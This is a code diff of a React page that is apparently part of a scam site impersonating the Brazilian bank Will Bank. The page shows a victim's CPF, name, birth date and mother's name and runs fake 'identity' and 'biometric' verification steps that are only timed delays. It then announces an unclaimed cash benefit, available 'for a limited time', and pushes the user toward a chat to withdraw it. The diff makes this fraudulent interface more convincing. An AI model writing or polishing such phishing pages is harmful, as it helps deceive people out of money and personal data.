@@ -1,19 +1,40 @@
 import { useEffect, useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { Card, CardContent } from "@/components/ui/card";
+import { 
+  CheckCircle, 
+  CreditCard, 
+  User, 
+  Calendar, 
+  Users, 
+  Shield,
+  Loader2,
+  ChevronRight,
+  BadgeCheck,
+  Wallet
+} from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { Progress } from "@/components/ui/progress";
-import { CreditCard, User, Calendar, Lightbulb, Search, Volume2 } from "lucide-react";
 import willbankLogo from "@/assets/willbank-logo.png";
 import { CPFData } from "@/lib/cpf";
+
+type VerificationStep = "searching" | "validating" | "calculating" | "ready";
+
+interface StepStatus {
+  searching: boolean;
+  validating: boolean;
+  calculating: boolean;
+}
 
 const Consulta = () => {
   const navigate = useNavigate();
   const location = useLocation();
-  const [progress, setProgress] = useState(0);
-  const [showData, setShowData] = useState(false);
+  const [currentStep, setCurrentStep] = useState<VerificationStep>("searching");
+  const [stepStatus, setStepStatus] = useState<StepStatus>({
+    searching: false,
+    validating: false,
+    calculating: false,
+  });
   const [dataRevealStep, setDataRevealStep] = useState(0);
-  const [isAudioPlaying, setIsAudioPlaying] = useState(false);
+  const [showValue, setShowValue] = useState(false);
 
   const cpfData: CPFData | undefined = location.state?.cpfData;
 
@@ -28,43 +49,39 @@ const Consulta = () => {
       return;
     }
 
-    // Progress bar animation
-    const progressInterval = setInterval(() => {
-      setProgress((prev) => {
-        if (prev >= 100) {
-          clearInterval(progressInterval);
-          return 100;
-        }
-        return prev + 2;
-      });
-    }, 60);
+    // Sequência de verificação
+    const sequence = async () => {
+      // Step 1: Searching
+      await delay(2000);
+      setStepStatus(prev => ({ ...prev, searching: true }));
+      setCurrentStep("validating");
 
-    // Show data after progress completes
-    const showDataTimer = setTimeout(() => {
-      setShowData(true);
-    }, 3500);
+      // Step 2: Validating
+      await delay(2000);
+      setStepStatus(prev => ({ ...prev, validating: true }));
+      setCurrentStep("calculating");
 
-    return () => {
-      clearInterval(progressInterval);
-      clearTimeout(showDataTimer);
+      // Step 3: Calculating
+      await delay(2000);
+      setStepStatus(prev => ({ ...prev, calculating: true }));
+      setCurrentStep("ready");
+
+      // Reveal data step by step
+      await delay(500);
+      for (let i = 1; i <= 4; i++) {
+        await delay(600);
+        setDataRevealStep(i);
+      }
+
+      // Show value
+      await delay(800);
+      setShowValue(true);
     };
+
+    sequence();
   }, [cpfData, navigate]);
 
-  // Animate data reveal step by step
-  useEffect(() => {
-    if (showData && dataRevealStep < 4) {
-      const revealTimer = setTimeout(() => {
-        setDataRevealStep((prev) => prev + 1);
-      }, 800);
-      return () => clearTimeout(revealTimer);
-    }
-  }, [showData, dataRevealStep]);
-
-  const handlePlayAudio = () => {
-    setIsAudioPlaying(true);
-    // Placeholder for audio - will be replaced later
-    setTimeout(() => setIsAudioPlaying(false), 3000);
-  };
+  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
   const handleEfetuarSaque = () => {
     navigate("/chat", { state: { cpfData, valorBeneficio } });
@@ -76,139 +93,156 @@ const Consulta = () => {
     { icon: CreditCard, label: "CPF", value: cpfData.cpf },
     { icon: User, label: "Nome", value: cpfData.nome },
     { icon: Calendar, label: "Nascimento", value: cpfData.dataNascimento },
-    { icon: Lightbulb, label: "Mãe", value: cpfData.nomeMae },
+    { icon: Users, label: "Nome da Mãe", value: cpfData.nomeMae },
   ];
 
+  const getStepIcon = (completed: boolean, isCurrent: boolean) => {
+    if (completed) return <CheckCircle className="w-5 h-5 text-emerald-400" />;
+    if (isCurrent) return <Loader2 className="w-5 h-5 text-primary animate-spin" />;
+    return <div className="w-5 h-5 rounded-full border-2 border-slate-600" />;
+  };
+
   return (
-    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
+    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex flex-col">
       {/* Header */}
-      <header className="bg-white px-6 py-4 shadow-sm">
-        <div className="max-w-4xl mx-auto flex items-center justify-between">
-          <img src={willbankLogo} alt="Will Bank" className="h-10 object-contain" />
-          <div className="flex items-center gap-3">
-            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center">
-              <span className="text-xs">👤</span>
-            </div>
-            <span className="text-sm font-medium text-gray-700">Usuário</span>
-          </div>
+      <header className="px-4 py-4 flex items-center justify-between">
+        <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
+        <div className="flex items-center gap-2 text-emerald-400 text-xs">
+          <Shield className="w-4 h-4" />
+          <span>Conexão segura</span>
         </div>
       </header>
 
       {/* Breadcrumb */}
-      <div className="bg-white border-b px-6 py-2">
-        <div className="max-w-4xl mx-auto flex items-center gap-2 text-sm text-gray-500">
-          <span>☰</span>
-          <span>Benefício</span>
-          <span>&gt;</span>
-          <span>Indenização</span>
-          <span>&gt;</span>
-          <span className="text-gray-900 font-medium">Análise</span>
+      <div className="px-4 py-2 border-b border-slate-700/50">
+        <div className="flex items-center gap-2 text-xs text-slate-400">
+          <span>Início</span>
+          <ChevronRight className="w-3 h-3" />
+          <span>Biometria</span>
+          <ChevronRight className="w-3 h-3" />
+          <span className="text-white font-medium">Consulta</span>
         </div>
       </div>
 
       {/* Main Content */}
-      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
-        <Card className="w-full max-w-lg shadow-xl border-0 overflow-hidden bg-white">
-          {/* Progress Bar */}
-          <div className="h-2 bg-gray-200">
-            <div 
-              className="h-full bg-[#FFE600] transition-all duration-100"
-              style={{ width: `${progress}%` }}
-            />
+      <main className="flex-1 flex flex-col items-center px-4 py-6">
+        <div className="w-full max-w-md space-y-6">
+
+          {/* Title */}
+          <div className="text-center space-y-2">
+            <h1 className="text-2xl font-bold text-white">
+              Analisando seus dados
+            </h1>
+            <p className="text-slate-400 text-sm">
+              Aguarde enquanto verificamos seu benefício
+            </p>
           </div>
-          
-          <CardContent className="p-6 sm:p-8 space-y-6">
-            {/* Video Section */}
-            <div className="relative aspect-video bg-gradient-to-br from-blue-900 to-blue-950 rounded-xl overflow-hidden">
-              {/* Video Placeholder - will be replaced */}
-              <div className="absolute inset-0 flex flex-col items-center justify-center">
-                <div className="w-full h-full bg-[url('/placeholder.svg')] bg-cover bg-center opacity-50" />
-                <div className="absolute inset-0 flex flex-col items-center justify-center">
-                  <Button
-                    onClick={handlePlayAudio}
-                    className="bg-[#FFE600] hover:bg-[#FFD700] text-black font-medium px-6 py-3 rounded-full flex items-center gap-2"
-                  >
-                    <Volume2 className={`w-5 h-5 ${isAudioPlaying ? "animate-pulse" : ""}`} />
-                    Clique para ouvir
-                  </Button>
-                </div>
+
+          {/* Verification Steps */}
+          <div className="bg-slate-800/50 rounded-xl p-4 space-y-4 border border-slate-700/50">
+            <div className="flex items-center gap-3">
+              {getStepIcon(stepStatus.searching, currentStep === "searching")}
+              <div className="flex-1">
+                <p className={`font-medium ${stepStatus.searching ? "text-emerald-400" : "text-white"}`}>
+                  Buscando cadastro
+                </p>
+                <p className="text-xs text-slate-500">Verificando base de dados</p>
               </div>
             </div>
 
-            {/* Data Fields */}
-            <div className="space-y-3">
-              {dataFields.map((field, index) => {
-                const Icon = field.icon;
-                const isRevealed = dataRevealStep > index;
-                
-                return (
-                  <div
-                    key={field.label}
-                    className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg border-2 border-[#FFE600]/30"
-                  >
-                    <div className="w-8 h-8 bg-[#FFE600] rounded-full flex items-center justify-center">
-                      <Icon className="w-4 h-4 text-black" />
-                    </div>
-                    <div className="flex-1">
-                      {isRevealed ? (
-                        <span className="font-medium text-gray-900 animate-fade-in">
-                          {field.value}
-                        </span>
-                      ) : (
-                        <span className="text-gray-400">---</span>
-                      )}
-                    </div>
-                  </div>
-                );
-              })}
-
-              {/* Status Field */}
-              <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg border-2 border-[#FFE600]/30">
-                <div className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center">
-                  <Search className="w-4 h-4 text-gray-600" />
-                </div>
-                <div className="flex-1">
-                  <span className={`text-sm ${showData && dataRevealStep >= 4 ? "text-green-600 font-medium" : "text-gray-500"}`}>
-                    {showData && dataRevealStep >= 4 
-                      ? "Consulta finalizada com sucesso!" 
-                      : "Sua consulta está em andamento..."}
-                  </span>
-                </div>
+            <div className="flex items-center gap-3">
+              {getStepIcon(stepStatus.validating, currentStep === "validating")}
+              <div className="flex-1">
+                <p className={`font-medium ${stepStatus.validating ? "text-emerald-400" : currentStep === "validating" || stepStatus.searching ? "text-white" : "text-slate-500"}`}>
+                  Validando identidade
+                </p>
+                <p className="text-xs text-slate-500">Confirmando dados biométricos</p>
               </div>
             </div>
 
-            {/* Result Section - Shows after data reveal */}
-            {showData && dataRevealStep >= 4 && (
-              <div className="space-y-4 animate-fade-in">
-                <div className="bg-[#FFE600]/10 rounded-xl p-4 text-center border-2 border-[#FFE600]">
-                  <p className="text-sm text-gray-600 mb-2">
-                    Seu saque já está disponível para resgate!
-                  </p>
-                  <p className="text-3xl font-bold text-gray-900">
-                    R$ {valorBeneficio.toLocaleString('pt-BR')},00
-                  </p>
-                </div>
+            <div className="flex items-center gap-3">
+              {getStepIcon(stepStatus.calculating, currentStep === "calculating")}
+              <div className="flex-1">
+                <p className={`font-medium ${stepStatus.calculating ? "text-emerald-400" : currentStep === "calculating" ? "text-white" : "text-slate-500"}`}>
+                  Calculando benefício
+                </p>
+                <p className="text-xs text-slate-500">Verificando valores disponíveis</p>
+              </div>
+            </div>
+          </div>
 
-                <Button
-                  onClick={handleEfetuarSaque}
-                  className="w-full h-14 text-lg font-bold bg-[#FFE600] hover:bg-[#FFD700] text-black rounded-full"
+          {/* User Data */}
+          <div className="space-y-3">
+            {dataFields.map((field, index) => {
+              const Icon = field.icon;
+              const isRevealed = dataRevealStep > index;
+              
+              return (
+                <div
+                  key={field.label}
+                  className={`flex items-center gap-3 p-4 bg-slate-800/30 rounded-xl border transition-all duration-300 ${
+                    isRevealed ? "border-emerald-500/30" : "border-slate-700/50"
+                  }`}
                 >
-                  ✓ Efetuar Meu Saque agora!
-                </Button>
+                  <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
+                    isRevealed ? "bg-emerald-500/20" : "bg-slate-700/50"
+                  }`}>
+                    <Icon className={`w-5 h-5 ${isRevealed ? "text-emerald-400" : "text-slate-500"}`} />
+                  </div>
+                  <div className="flex-1">
+                    <p className="text-xs text-slate-500">{field.label}</p>
+                    {isRevealed ? (
+                      <p className="font-medium text-white animate-fade-in">
+                        {field.value}
+                      </p>
+                    ) : (
+                      <div className="h-5 bg-slate-700/50 rounded w-32 animate-pulse" />
+                    )}
+                  </div>
+                  {isRevealed && <CheckCircle className="w-5 h-5 text-emerald-400" />}
+                </div>
+              );
+            })}
+          </div>
 
-                <p className="text-xs text-center text-gray-500">
-                  Clique no botão acima para efetuar o saque.
+          {/* Benefit Value */}
+          {showValue && (
+            <div className="animate-scale-in space-y-4">
+              <div className="bg-gradient-to-r from-emerald-500/20 to-emerald-600/10 rounded-2xl p-6 border border-emerald-500/30 text-center">
+                <div className="flex items-center justify-center gap-2 mb-3">
+                  <BadgeCheck className="w-6 h-6 text-emerald-400" />
+                  <span className="text-emerald-400 font-medium">Benefício Localizado!</span>
+                </div>
+                <p className="text-slate-400 text-sm mb-2">
+                  Valor disponível para saque:
+                </p>
+                <p className="text-4xl font-bold text-white">
+                  R$ {valorBeneficio.toLocaleString('pt-BR')},00
                 </p>
               </div>
-            )}
-          </CardContent>
-        </Card>
+
+              <Button
+                onClick={handleEfetuarSaque}
+                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground"
+              >
+                <Wallet className="w-5 h-5 mr-2" />
+                Iniciar saque agora
+                <ChevronRight className="w-5 h-5 ml-2" />
+              </Button>
+
+              <p className="text-center text-xs text-slate-500">
+                ⏱️ Saque disponível por tempo limitado
+              </p>
+            </div>
+          )}
+
+        </div>
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#FFE600] px-6 py-4">
-        <div className="max-w-4xl mx-auto flex justify-center">
-          <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
+      <footer className="px-4 py-4 border-t border-slate-800">
+        <div className="text-center">
+          <img src={willbankLogo} alt="Will Bank" className="h-5 mx-auto object-contain opacity-50" />
         </div>
       </footer>
     </div>
